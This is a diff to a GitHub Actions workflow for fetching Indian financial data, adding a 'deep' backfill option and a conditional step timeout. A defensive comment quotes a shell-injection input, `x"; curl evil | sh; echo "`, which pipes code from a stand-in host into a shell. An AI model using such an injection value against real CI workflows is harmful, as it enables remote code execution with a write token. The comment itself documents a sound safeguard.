@@ -11,6 +11,11 @@ on:
         description: 'Run a single source (market, rbi_forward_book, rbi_wss, rbihub, nsdl_fpi, india_misc)'
         required: false
         default: ''
+      deep:
+        description: 'Deep backfill: lift the per-run caps and drain the whole backlog in one go (~45 min)'
+        type: boolean
+        required: false
+        default: false
 
 permissions:
   contents: write
@@ -38,16 +43,18 @@ jobs:
 
       - name: Fetch
         id: fetch
-        # Step timeout is BELOW the job timeout on purpose. The first run died on
-        # the job timeout and the commit step never executed, so nothing was saved.
+        # 50 minutes for a deep backfill, 30 otherwise — both BELOW the
+        # 60-minute job timeout on purpose. The first run died on the job
+        # timeout and the commit step never executed, so nothing was saved.
         # Capping the step means a slow fetch is killed but the commit still runs.
-        timeout-minutes: 30
+        timeout-minutes: ${{ github.event.inputs.deep == 'true' && 50 || 30 }}
         continue-on-error: true          # commit partial results even on failure
         env:
           # Passed via env, never interpolated into the shell: an input like
           # `x"; curl evil | sh; echo "` would otherwise execute with a
           # contents:write token.
           ONLY: ${{ github.event.inputs.only }}
+          DEEP: ${{ github.event.inputs.deep == 'true' && '1' || '' }}
         run: |
           if [ -n "$ONLY" ]; then
             python run.py --only "$ONLY"
